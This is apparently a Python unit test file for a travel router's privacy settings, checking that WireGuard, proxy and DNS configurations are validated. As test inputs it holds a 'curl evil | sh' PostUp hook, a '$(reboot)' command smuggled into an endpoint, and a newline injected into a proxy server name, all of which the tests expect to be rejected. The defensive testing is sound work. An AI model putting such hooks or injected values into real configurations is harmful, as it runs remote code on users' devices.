import base64
import unittest

from travelrouter.policy import render_unbound
from travelrouter.privacy import proxy_config, wireguard_config


class PrivacyTests(unittest.TestCase):
    def wireguard(self, extra=''):
        private = base64.b64encode(bytes(range(32))).decode()
        public = base64.b64encode(bytes(range(32, 64))).decode()
        return (f'[Interface]\nPrivateKey={private}\nAddress=10.7.0.2/32\n{extra}'
                f'\n[Peer]\nPublicKey={public}\nEndpoint=vpn.example.org:51820\nAllowedIPs=0.0.0.0/0\n')

    def test_wireguard_rejects_executable_hooks_and_split_tunnels(self):
        with self.assertRaises(ValueError):
            wireguard_config(self.wireguard('PostUp=curl evil | sh\n'))
        with self.assertRaises(ValueError):
            wireguard_config(self.wireguard().replace('0.0.0.0/0', '10.0.0.0/8'))

    def test_wireguard_only_emits_validated_settings(self):
        result = wireguard_config(self.wireguard())
        self.assertIn('AllowedIPs = 0.0.0.0/0', result)
        self.assertIn('Endpoint = vpn.example.org:51820', result)
        self.assertNotIn('DNS =', result)
        with self.assertRaises(ValueError):
            wireguard_config(self.wireguard().replace('vpn.example.org', '$(reboot)'))

    def test_https_proxy_enables_certificate_validation(self):
        config = proxy_config({'type': 'https', 'server': 'proxy.example.org', 'port': 443,
                               'username': 'test', 'password': 'test-only'}, '192.0.2.9', 'wlan1')
        outbound = config['outbounds'][0]
        self.assertTrue(outbound['tls']['enabled'])
        self.assertNotIn('insecure', outbound['tls'])
        self.assertEqual(outbound['tls']['server_name'], 'proxy.example.org')
        self.assertEqual(config['route']['final'], 'proxy-out')
        self.assertTrue(config['inbounds'][0]['strict_route'])

    def test_socks_requires_explicit_unencrypted_transport_acknowledgement(self):
        with self.assertRaises(ValueError):
            proxy_config({'type': 'socks5', 'server': 'proxy.example.org', 'port': 1080}, '192.0.2.9', 'wlan1')

    def test_invalid_proxy_endpoint_is_rejected(self):
        for server, port in [('evil\nfield', 443), ('proxy.example.org', -1), ('proxy.example.org', True)]:
            with self.assertRaises(ValueError):
                proxy_config({'type': 'https', 'server': server, 'port': port}, '192.0.2.9', 'wlan1')

    def test_recursive_dns_caches_and_has_no_forwarders(self):
        recursive = render_unbound('recursive')
        self.assertIn('root-hints:', recursive)
        self.assertNotIn('forward-zone:', recursive)
        self.assertIn('msg-cache-size: 16m', recursive)
        self.assertIn('rrset-cache-size: 32m', recursive)
        self.assertIn('harden-dnssec-stripped: yes', recursive)
        dot = render_unbound('dot')
        self.assertIn('forward-tls-upstream: yes', dot)
        self.assertIn('#cloudflare-dns.com', dot)
        with self.assertRaises(ValueError):
            render_unbound('invalid')
